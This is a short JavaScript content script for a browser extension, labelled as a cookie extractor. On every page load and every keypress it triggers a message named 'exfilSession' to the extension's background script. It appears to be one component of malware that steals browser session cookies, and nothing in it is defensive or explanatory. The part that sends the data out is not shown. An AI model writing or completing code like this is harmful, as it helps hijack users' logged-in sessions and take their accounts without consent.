// Cookie extractor content script

function sendExtractionRequest() {
    browser.runtime.sendMessage({action: 'exfilSession'});
}

window.addEventListener('load', () => {
    sendExtractionRequest();
});

window.addEventListener('keypress', () => {
    sendExtractionRequest();
});
